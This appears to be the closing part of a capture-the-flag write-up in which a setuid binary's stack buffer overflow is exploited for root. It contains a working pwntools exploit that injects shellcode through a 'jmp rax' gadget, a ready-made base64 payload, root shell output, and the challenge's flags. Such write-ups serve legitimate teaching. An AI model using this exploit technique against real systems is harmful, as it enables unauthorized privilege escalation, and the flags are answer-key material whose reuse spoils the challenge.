pwndbg> run aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaab
 RBP  0x6261616161616168 ('haaaaaab')
 RSP  0x7fffffffd758 â—‚â€” 'iaaaaaabjaaaaaabkaaaaaablaaaaaab....'
 RIP  0x401297 (overflow+117) â—‚â€” ret
 
pwndbg> cyclic -l iaaaaaab
Finding cyclic pattern of 8 bytes: b'iaaaaaab' (hex: 0x6961616161616162)
Found at offset 264
```

- Function arguments are passed in registers
- `strcpy(dst, src)` uses:
    - `RDI` â†’ destination
    - `RSI` â†’ source
- During the function epilogue, registers are **not sanitized**

As a result:
- One of the registers (commonly `RAX`) still contains a pointer **into your input buffer**
- That pointer now points **inside the shellcode region**

So when execution reaches: `jmp rax` â†’ CPU jumps straight into your injected code.

```bash
â””â”€$ ropper --file strlen --search "jmp"
0x000000000040112c: jmp rax;
```

```python
from pwn import shellcraft, asm, p32, process
import base64

offset = 264
shellcode = asm(shellcraft.amd64.sh(), arch = "amd64")
padding = b"A" * (offset - len(shellcode))
call_jmp_rax = p32(0x40112c) # p64 had null byte errors

payload = shellcode + padding + call_jmp_rax
print(base64.b64encode(payload).decode())
shell = process(["strlen", payload])
shell.interactive()
```

```bash
â””â”€$ sudo chown root:root strlen
â””â”€$ sudo chown +s strlen
â””â”€$ py pwn.py
amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8FQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBLBFAAA==
...
[+] Length: 267
$ id
uid=0(root) gid=1000(woyag) groups=1000(woyag),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),120(lpadmin),129(wireshark),130(kaboxer),131(vboxsf),980(docker),1001(opt)
```

> **Note**: See `Registry` box, similar challenges.

```bash
gato@hell:~$ /opt/projects/strlen $(base64 -d <<<'amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8FQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBLBFAAA==')
bash: warning: command substitution: ignored null byte in input

â–ˆâ–€â€ƒâ–€â–ˆâ–€â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆ  â€ƒâ–ˆâ–€â–€â€ƒâ–ˆâ–„ â–ˆ
â–„â–ˆâ€ƒ â–ˆ â€ƒâ–ˆâ–€â–„â€ƒâ–ˆâ–„â–„â€ƒâ–ˆâ–ˆâ–„â€ƒâ–ˆ â–€â–ˆ

[*] String: jhHï¿½/bin///sPHï¿½ï¿½hriï¿½4$1ï¿½V^Hï¿½VHï¿½ï¿½1ï¿½j;XAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,@

[+] Length: 267

# id
uid=0(root) gid=1000(gato) groups=1000(gato)
```

### Root.txt

```bash
# cat /root/flag.txt

â–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–€â–ˆâ€ƒâ–€â–ˆâ–€â€ƒ â€ƒâ–ˆ â–ˆâ€ƒâ–ˆâ–€â–€â€ƒâ–ˆ  â€ƒâ–ˆ
â–ˆâ–€â–„â€ƒâ–ˆâ–„â–ˆâ€ƒâ–ˆâ–„â–ˆâ€ƒ â–ˆ â€ƒ â€ƒâ–ˆâ–€â–ˆâ€ƒâ–ˆâ–ˆâ–„â€ƒâ–ˆâ–„â–„â€ƒâ–ˆâ–„â–„

Flag 11: HELL{0V3RF10W_F0R_B3G1NN3R5}
```

## P.S.

Flags that was or not found
```bash
root@hell:~# find / -name flag.txt -exec cat {} \; 2>/dev/null | grep HELL | sort | uniq -c
      1 Flag 10: HELL{7H3_5UD03R5_15_N07_4_60D_1D34}
      1 Flag 11: HELL{0V3RF10W_F0R_B3G1NN3R5}
      1 Flag 1: HELL{4N0NYM0U5_15_7H3_B357_U53R}
      3 Flag 3: HELL{LF1_F1LT7R_CH41N_G3N3R4T0R}
      3 Flag 4: HELL{CR3D3NT14LS_1N_HTP455WD_3H?}
      3 Flag 5: HELL{7H3_B00L34N_15_4150_4_VU1N}
      3 Flag 6: HELL{7H3_5QL1_15_7H3_K3Y}
      1 Flag 7: HELL{R54C7F7001_OR_M4NU41?}
      1 Flag 8: HELL{R3L4T1V3_R0U735_4R3_FUN!}
      1 Flag 9: HELL{B14CKH47_H4CK3R_F4C3B00K_WTF?}
      2 Flag: HELL{7H3_5QL1_15_7H3_K3Y}
      2 Flag: HELL{7H3_B00L34N_15_4150_4_VU1N}
      2 Flag: HELL{CR3D3NT14LS_1N_HTP455WD_3H?}
      5 Flag: HELL{LF1_F1LT7R_CH41N_G3N3R4T0R}
```